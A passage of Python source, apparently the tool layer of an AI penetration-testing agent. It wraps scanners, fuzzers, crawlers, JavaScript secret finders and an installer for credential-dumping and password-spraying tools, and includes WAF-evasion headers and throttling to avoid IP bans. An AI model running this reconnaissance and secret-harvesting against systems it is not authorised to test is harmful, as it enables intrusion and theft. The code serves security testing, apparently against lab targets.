        return f"Error: {e}"


@function_tool()
def sslscan_check(target: str, options: str = "") -> str:
    """
    Audit SSL/TLS configuration of a target. Checks for weak ciphers, expired certs,
    Heartbleed, POODLE, and other SSL vulnerabilities.

    Args:
        target: Target host:port (e.g., example.com:443)
        options: Additional sslscan options

    Returns:
        SSL/TLS configuration and vulnerabilities
    """
    try:
        cmd = ["sslscan", "--no-colour", target] + (options.split() if options else [])
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout.strip() or result.stderr.strip()
        if not output:
            return f"No SSL/TLS results for {target}. Host may not support SSL."
        return f"## SSLScan Results: {target}\n\n{output}"
    except FileNotFoundError:
        return "Error: sslscan not found. Install with: sudo apt install sslscan"
    except subprocess.TimeoutExpired:
        return "Error: sslscan timed out after 5 minutes"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def telnet_send(host: str, port: int, commands: str, timeout: int = 10) -> str:
    """
    Send commands to a service via telnet-style connection.
    Useful for interacting with SMTP, HTTP, FTP, etc.

    Args:
        host: Target hostname or IP
        port: Target port
        commands: Newline-separated commands to send
        timeout: Connection timeout

    Returns:
        Service responses to each command
    """
    try:
        responses = []
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            # Read banner
            try:
                banner = sock.recv(4096).decode("utf-8", errors="replace")
                if banner.strip():
                    responses.append(f"Banner: {banner.strip()}")
            except socket.timeout:
                pass

            for line in commands.splitlines():
                if not line.strip():
                    continue
                sock.sendall((line + "\r\n").encode())
                time.sleep(0.5)
                try:
                    resp = sock.recv(4096).decode("utf-8", errors="replace")
                    responses.append(f">>> {line}\n{resp.strip()}")
                except socket.timeout:
                    responses.append(f">>> {line}\n(no response)")

        return f"Response from {host}:{port}:\n" + "\n\n".join(responses)
    except socket.timeout:
        return f"Connection to {host}:{port} timed out"
    except Exception as e:
        return f"Error connecting to {host}:{port}: {e}"


@function_tool()
def _install_recon_tools_impl(tools: str = "all") -> str:
    """
    Install reconnaissance (and optionally all framework) tools.

    Args:
        tools: "all", a comma-separated list of tool names, or a single tool name.

    Returns:
        Human-readable installation log.
    """
    import platform
    import shutil

    results = []
    system = platform.system().lower()

    def _run(cmd: list, label: str) -> str:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if r.returncode == 0:
                return f"  ✓ {label}"
            return f"  ✗ {label}: {(r.stderr or r.stdout).strip()[:120]}"
        except subprocess.TimeoutExpired:
            return f"  ✗ {label}: timed out"
        except FileNotFoundError as e:
            return f"  ✗ {label}: command not found ({e.filename})"
        except Exception as e:
            return f"  ✗ {label}: {e}"

    def _pip(pkg):
        import sys
        return _run([sys.executable, "-m", "pip", "install", "-q", "--break-system-packages", pkg], f"pip install {pkg}")

    def _go(path):
        return _run(["go", "install", path], f"go install {path}")

    def _apt(pkg):
        return _run(["sudo", "apt-get", "install", "-y", "-qq", pkg], f"apt install {pkg}")

    ALL_TOOLS = {
        "subfinder":   lambda: _go("github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"),
        "httpx":       lambda: _go("github.com/projectdiscovery/httpx/cmd/httpx@latest"),
        "nuclei":      lambda: _go("github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"),
        "alterx":      lambda: _go("github.com/projectdiscovery/alterx/cmd/alterx@latest"),
        "naabu":       lambda: _go("github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"),
        "dnsx":        lambda: _go("github.com/projectdiscovery/dnsx/cmd/dnsx@latest"),
        "katana":      lambda: _go("github.com/projectdiscovery/katana/cmd/katana@latest"),
        "gau":         lambda: _go("github.com/lc/gau/v2/cmd/gau@latest"),
        "gospider":    lambda: _go("github.com/jaeles-project/gospider@latest"),
        "assetfinder": lambda: _go("github.com/tomnomnom/assetfinder@latest"),
        "waybackurls": lambda: _go("github.com/tomnomnom/waybackurls@latest"),
        "ffuf":        lambda: _go("github.com/ffuf/ffuf/v2@latest"),
        "kerbrute":    lambda: _go("github.com/ropnop/kerbrute@latest"),
        "chisel":      lambda: _go("github.com/jpillora/chisel@latest"),
        "nmap":        lambda: _apt("nmap"),
        "gobuster":    lambda: _apt("gobuster"),
        "sqlmap":      lambda: _apt("sqlmap"),
        "hydra":       lambda: _apt("thc-hydra"),
        "nikto":       lambda: _apt("nikto"),
        "whatweb":     lambda: _apt("whatweb"),
        "dnsrecon":    lambda: _apt("dnsrecon"),
        "dnsenum":     lambda: _apt("dnsenum"),
        "sslscan":     lambda: _apt("sslscan"),
        "amass":       lambda: _apt("amass"),
        "masscan":     lambda: _apt("masscan"),
        "wafw00f":     lambda: _pip("wafw00f"),
        "arjun":       lambda: _pip("arjun"),
        "dirsearch":   lambda: _pip("dirsearch"),
        "shodan":      lambda: _pip("shodan"),
        "fierce":      lambda: _pip("fierce"),
        "impacket":    lambda: _pip("impacket"),
        "pwntools":    lambda: _pip("pwntools"),
        "ropgadget":   lambda: _pip("ropgadget"),
        "cloud-enum":  lambda: _pip("cloud-enum"),
        "certipy":     lambda: _pip("certipy-ad"),
        "lsassy":      lambda: _pip("lsassy"),
        "coercer":     lambda: _pip("coercer"),
        "sprayhound":  lambda: _pip("sprayhound"),
        "plumhound":   lambda: _pip("plumhound"),
        "roadrecon":   lambda: _pip("roadrecon"),
        "msolspray":   lambda: _pip("msolspray"),
        "fpdf2":       lambda: _pip("fpdf2"),
        "matplotlib":  lambda: _pip("matplotlib"),
        "evil-winrm":  lambda: _run(["sudo", "gem", "install", "evil-winrm"], "gem install evil-winrm"),
        "wpscan":      lambda: _run(["sudo", "gem", "install", "wpscan"], "gem install wpscan"),
    }

    if tools.strip().lower() == "all":
        to_install = list(ALL_TOOLS.keys())
    else:
        to_install = [t.strip() for t in tools.split(",") if t.strip()]

    if system != "linux":
        results.append(f"⚠  Auto-install is only supported on Linux (detected: {system}).")
        results.append("   Use install_tools.sh or install manually.")
        return "\n".join(results)

    results.append(f"Installing {len(to_install)} tool(s)...\n")
    for tool in to_install:
        if tool not in ALL_TOOLS:
            results.append(f"  ? {tool}: unknown tool – skipped")
            continue
        if shutil.which(tool):
            results.append(f"  ✓ {tool} (already installed)")
            continue
        results.append(ALL_TOOLS[tool]())

    results.append("\nDone. Run 'tools check' to verify.")
    return "\n".join(results)


@function_tool()
def linkfinder_js(target: str, output_format: str = "cli") -> str:
    """
    Extract endpoints and secrets from JavaScript files using LinkFinder.

    Args:
        target: URL to a JS file, a webpage, OR a local directory of .js files
                (e.g. the session js/ folder saved by gospider_crawl / katana_crawl).
                Pass a directory to scan all .js files in bulk.
        output_format: Output format (cli, html)

    Returns:
        Endpoints and potentially sensitive URLs found in JavaScript
    """
    from pathlib import Path as _Path

    # ── Directory mode: scan all .js files inside it ─────────────────────────
    if os.path.isdir(target):
        js_files = sorted(_Path(target).glob("*.js"))
        if not js_files:
            return f"No .js files found in directory: {target}"
        all_results: list[str] = []
        for jf in js_files:
            try:
                r = subprocess.run(
                    ["python3", "linkfinder", "-i", str(jf), "-o", output_format],
                    capture_output=True, text=True, timeout=60,
                )
                lines = [
                    l for l in (r.stdout or "").splitlines()
                    if l.startswith("/") or l.startswith("http")
                ]
                if lines:
                    all_results.append(f"### {jf.name} ({len(lines)} endpoints)\n" + "\n".join(lines))
            except Exception:
                pass
        if not all_results:
            return f"No endpoints found in {len(js_files)} JS files in {target}"
        return (
            f"## LinkFinder — {len(js_files)} JS files in {target}\n\n"
            + "\n\n".join(all_results)
        )

    # ── Single URL / file mode ────────────────────────────────────────────────
    try:
        result = subprocess.run(
            ["python3", "linkfinder", "-i", target, "-o", output_format],
            capture_output=True, text=True, timeout=300
        )
        output = result.stdout.strip() or result.stderr.strip()
        if not output:
            return "No endpoints found"
        lines = [l for l in output.splitlines() if l.startswith("/") or l.startswith("http")]
        if not lines:
            return "No endpoints found"
        count = len(lines)
        return f"Found {count} endpoints:\n" + "\n".join(lines)
    except FileNotFoundError:
        return "Error: LinkFinder not installed. Install: pip install linkfinder"
    except subprocess.TimeoutExpired:
        return "Error: LinkFinder timed out after 5 minutes"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def secretfinder_js(target: str) -> str:
    """
    Find secrets and sensitive data in JavaScript files (API keys, tokens, etc).

    Args:
        target: URL to a JS file, a page URL, OR a local directory of .js files
                (e.g. the session js/ folder saved by gospider_crawl / katana_crawl).
                Pass a directory to scan all .js files in bulk.

    Returns:
        Found secrets, API keys, tokens
    """
    from pathlib import Path as _Path

    # ── Directory mode: scan all .js files inside it ─────────────────────────
    if os.path.isdir(target):
        js_files = sorted(_Path(target).glob("*.js"))
        if not js_files:
            return f"No .js files found in directory: {target}"
        all_results: list[str] = []
        for jf in js_files:
            try:
                r = subprocess.run(
                    ["python3", "secretfinder", "-i", str(jf), "-o", "cli"],
                    capture_output=True, text=True, timeout=60,
                )
                out = (r.stdout or "").strip()
                if out:
                    all_results.append(f"### {jf.name}\n{out}")
            except Exception:
                pass
        if not all_results:
            return f"No secrets found in {len(js_files)} JS files in {target}"
        return (
            f"## SecretFinder — {len(js_files)} JS files in {target}\n\n"
            + "\n\n".join(all_results)
        )

    # ── Single URL / file mode ────────────────────────────────────────────────
    try:
        result = subprocess.run(
            ["python3", "secretfinder", "-i", target, "-o", "cli"],
            capture_output=True, text=True, timeout=300
        )
        output = result.stdout.strip() or result.stderr.strip()
        if not output:
            return f"No secrets found in {target}"
        return f"Secrets found in {target}:\n{output}"
    except FileNotFoundError as e:
        return f"Error: SecretFinder not installed or failed: {e}"
    except subprocess.TimeoutExpired:
        return "Error: SecretFinder timed out after 5 minutes"
    except Exception as e:
        return f"Error: SecretFinder not installed or failed: {e}"


@function_tool()
def jsparser_analyze(url: str) -> str:
    """
    Analyze JS files from a webpage to extract endpoints and analyze structure.

    Args:
        url: URL of website to analyze JS files

    Returns:
        Endpoints, API paths, and structure found in JS files
    """
    try:
        headers = {"User-Agent": "Mozilla/5.0 (compatible; CyberCoPilot/1.0)"}
        resp = requests.get(url, headers=headers, timeout=30)
        js_urls = re.findall(r'<script[^>]*src=["\']([^"\']+\.js[^"\']*)["\']', resp.text)
        if not js_urls:
            return f"No external JavaScript files found on {url}"

        all_endpoints = []
        for js_path in js_urls[:20]:
            js_url = urllib.parse.urljoin(url, js_path)
            try:
                js_resp = requests.get(js_url, headers=headers, timeout=15)
                js_content = js_resp.text
                endpoints = []
                for line in js_content.splitlines():
                    line = line.strip()
                    if line.startswith("/") or "api/" in line.lower() or "/v1/" in line or "/v2/" in line:
                        clean = re.sub(r'["\';,\s]', '', line)
                        if clean and len(clean) > 3:
                            endpoints.append(clean)
                if endpoints:
                    all_endpoints.append(f"\n[{js_url}]\n  " + "\n  ".join(set(endpoints[:30])))
            except Exception:
                pass

        if not all_endpoints:
            return f"No interesting endpoints found in JS files on {url}"
        return f"## JS Endpoint Analysis: {url}\n\nFound {len(js_urls)} JS files:\n" + "\n".join(all_endpoints)
    except Exception as e:
        return f"Error analyzing JS files: {e}"


@function_tool()
def ffuf_content_fuzz(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,txt",
    threads: int = 50,
    match_code: str = "200,204,301,302,307,401,403",
) -> str:
    """
    Fast content discovery using ffuf.

    Args:
        url: Target URL with FUZZ keyword (e.g., http://target.com/FUZZ)
        wordlist: Path to wordlist file
        extensions: Comma-separated extensions to test
        threads: Number of threads
        match_code: HTTP status codes to match

    Returns:
        Discovered paths and files
    """
    try:
        if "FUZZ" not in url:
            url = url.rstrip("/") + "/FUZZ"
        output_file = "/tmp/ffuf_output.json"
        ext_flags = []
        for ext in extensions.split(","):
            ext = ext.strip()
            if ext:
                ext_flags += ["-e", f".{ext}"]
        cmd = (
            ["ffuf", "-u", url, "-w", f"{wordlist}:FUZZ"]
            + ext_flags
            + ["-t", str(threads), "-mc", match_code, "-o", output_file, "-of", "json", "-s"]
        )
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=1200)

        if os.path.exists(output_file):
            with open(output_file) as f:
                data = json.load(f)
            results = data.get("results", [])
            if not results:
                return f"ffuf found no results for {url}"
            lines = [f"## ffuf Results: {url}\n\nFound {len(results)} paths:\n"]
            for r in results:
                status = r.get("status", "?")
                length = r.get("length", "?")
                path = r.get("url", r.get("input", {}).get("FUZZ", ""))
                lines.append(f"  [{status}] {path} (len:{length})")
            return "\n".join(lines)
        stdout = result.stdout.strip()
        if not stdout:
            return f"ffuf returned no output for {url}"
        return f"## ffuf Results: {url}\n\n{stdout}"
    except FileNotFoundError:
        return "Error: ffuf not found. Install: go install github.com/ffuf/ffuf/v2@latest"
    except subprocess.TimeoutExpired:
        return "Error: ffuf timed out after 20 minutes"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def feroxbuster_scan(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,js,txt,bak,xml,json",
    threads: int = 50,
    depth: int = 3,
    rate_limit: str = "",
    filter_status: str = "",
    timeout: str = "1200",
) -> str:
    """
    Recursive content discovery with feroxbuster.
    PREFERRED over gobuster_scan — never run both on the same URL.

    Uses SecLists medium wordlist if available (falls back to common.txt).
    When a virtual host is registered in context, uses the vhost hostname
    directly so the server returns the correct content.

    Args:
        url: Target URL (use the vhost hostname if known, e.g. http://facts.htb)
        wordlist: Path to wordlist file (auto-upgrades to medium SecLists if available)
        extensions: Comma-separated extensions to test
        threads: Number of threads
        depth: Recursion depth
        rate_limit: Optional requests-per-second limit passed to feroxbuster
        filter_status: Optional comma-separated HTTP status codes to filter out
        timeout: Local subprocess timeout in seconds

    Returns:
        Discovered paths with interesting findings highlighted
    """
    global _ferox_scanned_urls
    import tempfile

    def _positive_int(value, default: int, min_value: int = 1, max_value: int = 100000) -> int:
        try:
            parsed = int(str(value).strip())
            return min(max(parsed, min_value), max_value)
        except Exception:
            return default

    # ── Auto-upgrade wordlist to medium if caller left default small one ──
    _MEDIUM_CANDIDATES = [
        "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
        "/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt",
        "/opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt",
        "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
        "/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
    ]
    if wordlist == "/usr/share/wordlists/dirb/common.txt":
        for candidate in _MEDIUM_CANDIDATES:
            if os.path.isfile(candidate):
                wordlist = candidate
                break

    # ── Vhost resolution — prefer hostname URL over raw IP ────────────────────
    # If caller passed an IP-based URL, check if there's a vhost hostname mapping.
    # Feroxbuster works better hitting the hostname directly (relies on /etc/hosts)
    # because the server routes requests based on Host header for virtual hosting.
    _scan_url = url
    _extra_header = ""
    try:
        from src.tools.http_proxy import resolve_vhost as _resolve_vhost
        _parsed = urllib.parse.urlparse(url)
        _hostname = _parsed.hostname or ""
        _is_ip = bool(re.match(r'^\d+\.\d+\.\d+\.\d+$', _hostname))

        if _is_ip:
            # Look up registered vhost for this IP in the context hub
            try:
                from src.sdk.context_hub import get_context_hub as _gch
                _hub = _gch()
                _vhost_map = getattr(_hub, "findings", {}).get("vhost_mappings", {})
                _vhost_name = _vhost_map.get(_hostname, "") if isinstance(_vhost_map, dict) else ""
            except Exception:
                _vhost_name = ""

            if _vhost_name:
                import socket as _sock
                try:
                    # If /etc/hosts has it, use hostname directly — best approach
                    _sock.gethostbyname(_vhost_name)
                    _scan_url = url.replace(_hostname, _vhost_name)
                except _sock.gaierror:
                    # /etc/hosts not updated yet — use IP + Host header
                    _extra_header = _vhost_name
            else:
                # No vhost known — try resolve_vhost for fallback
                _scan_url, _extra_header = _resolve_vhost(url)
        else:
            # Already a hostname URL — just resolve in case it needs IP rewrite
            _scan_url, _extra_header = _resolve_vhost(url)
    except Exception:
        _scan_url, _extra_header = url, ""

    # ── Dedup: prevent re-running on same target (cover both IP and hostname forms) ──
    _parsed_key = urllib.parse.urlparse(_scan_url)
    _netloc_key = _parsed_key.netloc.split(":")[0]  # strip port for key
    _dedup_keys = [f"{_parsed_key.scheme}://{_parsed_key.netloc}"]
    # Also add the original URL's netloc so IP and hostname hits both dedup
    _orig_parsed = urllib.parse.urlparse(url)
    _orig_key = f"{_orig_parsed.scheme}://{_orig_parsed.netloc}"
    if _orig_key not in _dedup_keys:
        _dedup_keys.append(_orig_key)

    for _dk in _dedup_keys:
        if _dk in _ferox_scanned_urls:
            return (f"[SKIPPED] feroxbuster already ran on {_dk} this session. "
                    f"Use the existing results — re-running returns identical output.")

    soft_404_warning = ""
    try:
        from src.tools.appsec.common import _get_evasion_headers as _geh
        import secrets as _secrets
        probe_path = f".ferox-probe-{_secrets.token_hex(4)}"
        probe_url = _scan_url.rstrip("/") + "/" + probe_path
        _r = requests.get(probe_url, headers=_geh(), timeout=10, verify=False, allow_redirects=False)
        if _r.status_code in (200, 301, 302) and len(_r.text or "") > 0:
            soft_404_warning = (
                "⚠️  SOFT-404 DETECTED: random path returned a non-404 response.\n"
                "  Results may be polluted by a catch-all handler. Consider:\n"
                f"    • --filter-size {len(_r.text or '')}\n"
                "    • --filter-status 200 (if safe)\n"
                "    • custom wordlist + manual validation\n"
            )
    except Exception:
        pass

    # NOTE: we register in _ferox_scanned_urls only AFTER a successful scan below
    # so that a failed run (missing wordlist, binary not found, etc.) can be retried.

    output_file = ""
    try:
        with tempfile.NamedTemporaryFile(mode="w", suffix="_ferox_output.txt", delete=False) as tf:
            output_file = tf.name

        safe_threads = _positive_int(threads, 50, min_value=1, max_value=200)
        safe_depth = _positive_int(depth, 3, min_value=0, max_value=20)
        safe_timeout = _positive_int(timeout, 1200, min_value=30, max_value=7200)

        cmd = [
            "feroxbuster", "--url", _scan_url, "-w", wordlist,
            "-x", extensions, "-t", str(safe_threads), "-d", str(safe_depth),
            "--no-state", "-o", output_file, "-q", "--time-limit", "10m"
        ]

        # ── Auto-detect cPanel/hosting panels and throttle threads ──────
        # cPanel CSF/mod_security will IP-ban at 50 threads within 60s
        if rate_limit:
            safe_rate = _positive_int(rate_limit, 5, min_value=1, max_value=1000)
            cmd.extend(["--rate-limit", str(safe_rate)])
        if filter_status:
            clean_status = ",".join(
                code.strip()
                for code in str(filter_status).replace(" ", ",").split(",")
                if code.strip().isdigit()
            )
            if clean_status:
                cmd.extend(["--filter-status", clean_status])

        _cpanel_indicators = False
        try:
            from src.repl.profiles import get_profile_manager
            _pm = get_profile_manager()
            _host = urllib.parse.urlparse(_scan_url).hostname or ""
            _profile = _pm.load_profile(_host) if _host else None
            if _profile:
                _services = {
                    str(p.get("port", "")): p
                    for p in getattr(_profile, "ports", [])
                    if isinstance(p, dict)
                }
                _cpanel_ports = {"2082", "2083", "2086", "2087", "2095", "2096"}
                if _cpanel_ports & set(str(p) for p in _services.keys()):
                    _cpanel_indicators = True
                # Also check if any service has "cpanel" in its name
                for _svc in _services.values():
                    if "cpanel" in str(_svc).lower() or "whm" in str(_svc).lower():
                        _cpanel_indicators = True
                        break
        except Exception:
            pass
        
        # Also check the task text for cPanel hints
        if "cpanel" in _scan_url.lower() or ":2082" in _scan_url or ":2083" in _scan_url:
            _cpanel_indicators = True

        if _cpanel_indicators and safe_threads > 15:
            import logging
            logging.getLogger("feroxbuster").warning(
                f"[CPANEL THROTTLE] Reducing threads {threads}→10 and adding rate-limit 5 (hosting panel detected)"
            )
            # Replace thread count in already-built cmd
            _t_idx = cmd.index("-t")
            cmd[_t_idx + 1] = "10"
            if "--rate-limit" not in cmd:
                cmd.extend(["--rate-limit", "5"])

        if _extra_header:
            cmd.extend(["-H", f"Host: {_extra_header}"])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=safe_timeout)
        if os.path.exists(output_file):
            with open(output_file) as f:
                content = f.read().strip()
            if content:
                # Guard against stale/misdirected results: ferox output contains
                # Configuration.target_url. Ensure it matches the intended scan URL.
                target_match = re.search(r'target_url:\s*"([^"]+)"', content)
                if target_match:
                    reported_target = target_match.group(1).strip()
                    reported_netloc = urllib.parse.urlparse(reported_target).netloc.lower()
                    requested_netloc = urllib.parse.urlparse(_scan_url).netloc.lower()
                    if reported_netloc and requested_netloc and reported_netloc != requested_netloc:
                        return (
                            "Error: feroxbuster returned results for a different target.\n"
                            f"Requested: {_scan_url}\n"
                            f"Reported : {reported_target}\n"
                            "This is usually caused by an external ferox config override."
                        )

                all_lines = [l for l in content.splitlines() if l.strip()]

                # Persist discovered paths into target profile so other agents can reuse
                try:
                    from src.repl.profiles import get_profile_manager
                    _pm = get_profile_manager()
                    _host = urllib.parse.urlparse(_scan_url).hostname or urllib.parse.urlparse(url).hostname
                    _profile_key = _host or _netloc_key or url
                    _added = 0
                    for _l in all_lines:
                        _parts = _l.split()
                        if not _parts:
                            continue
                        _maybe_url = _parts[-1]
                        if not _maybe_url.startswith("http"):
                            continue
                        try:
                            _p = urllib.parse.urlparse(_maybe_url).path or "/"
                        except Exception:
                            continue
                        _pm.add_web_directory(_profile_key, _p)
                        _added += 1
                        if _added >= 200:
                            break
                except Exception:
                    pass

                interesting = []
                status_counts: dict[str, int] = {}
                size_counts: dict[str, int] = {}
                for line in all_lines:
                    parts = line.split()
                    if len(parts) >= 6:
                        status = parts[0]
                        url_part = parts[-1] if parts[-1].startswith('http') else ''
                        # Track status code distribution for wildcard detection
                        if status.isdigit():
                            status_counts[status] = status_counts.get(status, 0) + 1
                        # Track response sizes (column index varies, look for digit-only fields)
                        for p in parts[1:5]:
                            if p.endswith('c') or p.endswith('l') or p.endswith('w'):
                                size_counts[p] = size_counts.get(p, 0) + 1
                        if status in ('200', '201', '204', '301', '302', '401', '403', '500') and url_part:
                            interesting.append(f"  [{status}] {url_part}")

                # ── Wildcard / uniform response detection ────────────────────
                wildcard_warning = ""
                total_responses = sum(status_counts.values())
                if total_responses >= 20 and status_counts:
                    dominant_status, dominant_count = max(status_counts.items(), key=lambda x: x[1])
                    dominant_pct = dominant_count / total_responses
                    if dominant_pct >= 0.90:
                        wildcard_warning = (
                            f"\n\n⚠️  WILDCARD / CATCHALL DETECTION ⚠️\n"
                            f"  {dominant_pct:.0%} of {total_responses} responses returned HTTP {dominant_status}.\n"
                            f"  This is almost certainly a wildcard/default response — the server returns\n"
                            f"  {dominant_status} for ANY path, so these are NOT real discovered paths.\n"
                            f"  Status distribution: {dict(sorted(status_counts.items()))}\n"
                            f"  ACTION REQUIRED: Do NOT trust these results. Instead:\n"
                            f"    1. Check if the server requires specific headers (Content-Type, Accept)\n"
                            f"    2. Run wafw00f_detect to check for WAF\n"
                            f"    3. Try VHost/subdomain enumeration instead\n"
                            f"    4. Use --filter-status {dominant_status} to exclude the wildcard\n"
                        )

                if soft_404_warning:
                    wildcard_warning = (
                        wildcard_warning + "\n" + soft_404_warning
                        if wildcard_warning else f"\n\n{soft_404_warning}"
                    )

                summary = ""
                if interesting:
                    summary = f"\n\n### INTERESTING PATHS ({len(interesting)} found)\n" + "\n".join(interesting[:60])
                    if len(interesting) > 60:
                        summary += f"\n  ... and {len(interesting) - 60} more"
                wl_note = f"(wordlist: {os.path.basename(wordlist)})"
                vhost_note = f" [scanning as {_scan_url}]" if _scan_url != url else ""
                # Strip JSON config lines (feroxbuster sometimes emits {"type":"config"...})
                filtered_content = "\n".join([line for line in content.splitlines() if not line.strip().startswith("{")])
                # Register as successfully scanned only on non-empty results
                for _dk in _dedup_keys:
                    _ferox_scanned_urls.add(_dk)
                return f"Found {len(all_lines)} paths {wl_note}{vhost_note}:{wildcard_warning}{summary}\n\nFull output:\n{filtered_content}"
        output = result.stdout.strip() or result.stderr.strip()
        if result.returncode != 0 and output:
            return f"Error: feroxbuster failed for {_scan_url}\n{output}"
        if not output:
            return f"feroxbuster found no paths for {_scan_url}"
        # Register on successful completion even if empty results
        for _dk in _dedup_keys:
            _ferox_scanned_urls.add(_dk)
        return f"## feroxbuster Results: {_scan_url}\n\n{output}"
    except FileNotFoundError:
        return "Error: feroxbuster not found. Install: cargo install feroxbuster"
    except subprocess.TimeoutExpired:
        return f"Error: feroxbuster timed out after {timeout} seconds"
    except Exception as e:
        return f"Error: {e}"
    finally:
        try:
            if 'output_file' in locals() and output_file and os.path.exists(output_file):
                os.remove(output_file)
        except Exception:
            pass


@function_tool()
def katana_crawl(
    target: str,
    depth: int = 3,
    js_crawl: bool = True,
    headless: bool = False,
    concurrency: int = 10,
) -> str:
    """
    Next-generation web crawler using Katana with JS rendering support.

    Args:
        target: Target URL or domain
        depth: Crawl depth
        js_crawl: Enable JS parsing
        headless: Use headless browser
        concurrency: Number of concurrent requests

    Returns:
        Crawled URLs with endpoints and parameters
    """
    try:
        output_file = "/tmp/katana_output.txt"
        cmd = [
            "katana", "-u", target, "-d", str(depth),
            "-c", str(concurrency), "-silent", "-o", output_file,
        ]
        if js_crawl:
            cmd.append("-jc")
        if headless:
            cmd.append("-headless")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=1200)

        urls = []
        if os.path.exists(output_file):
            with open(output_file) as f:
                urls = [l.strip() for l in f if l.strip()]

        if not urls:
            stdout = result.stdout.strip()
            if stdout:
                urls = stdout.splitlines()
        if not urls:
            return f"Katana found no URLs for {target}"

        count = len(urls)
        api_urls = [u for u in urls if any(k in u for k in ["/api/", "/v1/", "/v2/", "?", "="])]
        js_file_urls = [u for u in urls if u.endswith(".js") or ".js?" in u]
        sample = "\n".join(urls[:50])
        api_section = "\n".join(api_urls[:30]) if api_urls else "(none found)"

        out = (
            f"Found {count} URLs:\n"
            f"API endpoints:\n{api_section}\n\n"
            f"All URLs (sample):\n{sample}"
        )

        # ── Download JS files to session directory ───────────────────────────
        if js_file_urls:
            try:
                from src.repl.target_manager import get_target_manager as _gtm
                import urllib.parse as _up
                _js_dir = _gtm().get_js_dir()
                if _js_dir:
                    _downloaded = []
                    for _js_url in js_file_urls:
                        _raw_name = _up.urlparse(_js_url).path.rsplit('/', 1)[-1].split('?')[0]
                        _fname = re.sub(r'[^\w.\-]', '_', _raw_name)[:100] or "file.js"
                        _fpath = _js_dir / _fname
                        if _fpath.exists():
                            _downloaded.append(f"  {_fpath} (cached)")
                            continue
                        try:
                            import requests as _req
                            _r = _req.get(_js_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
                            if _r.status_code == 200:
                                _fpath.write_bytes(_r.content)
                                _downloaded.append(f"  {_fpath}")
                        except Exception:
                            pass
                    if _downloaded:
                        out += f"\n\n### JS Files Downloaded → {_js_dir}\n"
                        out += "\n".join(_downloaded[:15])
                        out += (
                            f"\n\n💡 Run secretfinder_js('{_js_dir}') or "
                            f"linkfinder_js('{_js_dir}') to scan for secrets/endpoints"
                        )
            except Exception:
                pass

        return out
    except FileNotFoundError:
        return "Error: katana not found. Install: go install github.com/projectdiscovery/katana/cmd/katana@latest"
    except subprocess.TimeoutExpired:
        return "Error: katana timed out after 20 minutes"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def hakrawler(
    url: str,
    depth: int = 3,
    scope: str = "subs",
    insecure: bool = False,
) -> str:
    """
    Fast web crawler using hakrawler.

    Args:
        url: Target URL
        depth: Crawl depth (default 3)
        scope: Scope (strict, subs, fuzzy)
        insecure: Skip TLS verification

    Returns:
        Crawled URLs
    """
    try:
        cmd = ["hakrawler", "-url", url, "-depth", str(depth), "-scope", scope, "-plain"]
        if insecure:
            cmd.append("-insecure")
        proc = subprocess.run(
            cmd, capture_output=True, text=True, input=url, timeout=120
        )
        output = proc.stdout.strip() or proc.stderr.strip()
        if not output:
            return f"No URLs found by hakrawler for {url}"
        lines = output.splitlines()
        return f"## Hakrawler Results: {url}\n\nFound {len(lines)} URLs:\n{output}"
    except FileNotFoundError:
        return "Error: hakrawler not found. Install: go install github.com/hakluke/hakrawler@latest"
    except subprocess.TimeoutExpired:
        return "Error: hakrawler timed out after 2 minutes"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def gau_harvest(
    url: str,
    options: str = "",
    include_subs: bool = True,
    blacklist: str = "png,jpg,jpeg,gif,css,svg,ico,woff,woff2,ttf,eot,mp4,mp3,avi,webm,zip,rar,7z",
) -> str:
    """
    Harvest known URLs from open sources (Wayback Machine, Common Crawl, OTX, URLScan)
    using gau (Get All URLs).

    Args:
        url: Target domain or URL (e.g. example.com or http://example.com)
        options: Extra gau flags (e.g. "--subs --blacklist png,jpg,css")
        include_subs: Include subdomains in archive search (default: True)
        blacklist: Comma-separated extensions to exclude (default: common static assets)

    Returns:
        Discovered URLs, deduplicated and grouped by extension/path type
    """
    import shlex as _shlex
    from urllib.parse import urlparse as _up
    # gau expects a bare domain, not a full URL
    _parsed = _up(url)
    target_domain = _parsed.netloc or _parsed.path.split('/')[0]

    # gau only works on domain names, not raw IPs
    import re as _re
    _is_ip = _re.match(r'^\d{1,3}(\.\d{1,3}){3}$', target_domain)
    if _is_ip:
        return (
            f"Error: gau requires a domain name, not a raw IP address ({target_domain}).\n"
            f"gau queries external archives (Wayback, CommonCrawl, OTX, URLScan) which only \n"
            f"index by domain name — scanning an IP will always timeout or return zero results.\n"
            f"If the target has a hostname (e.g. facts.htb), pass that instead: gau_harvest('facts.htb')"
        )

    timeout_seconds = 600

    try:
        cmd = ["gau", target_domain]
        opt_list = _shlex.split(options) if options else []
        if include_subs and "--subs" not in opt_list:
            cmd.append("--subs")
        if blacklist and "--blacklist" not in opt_list:
            cmd += ["--blacklist", blacklist]
        if opt_list:
            cmd += opt_list
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_seconds)
        output = (result.stdout or "").strip()
        if not output:
            err = (result.stderr or "").strip()
            return f"gau returned no URLs for {target_domain}.\nstderr: {err or '(none)'}"

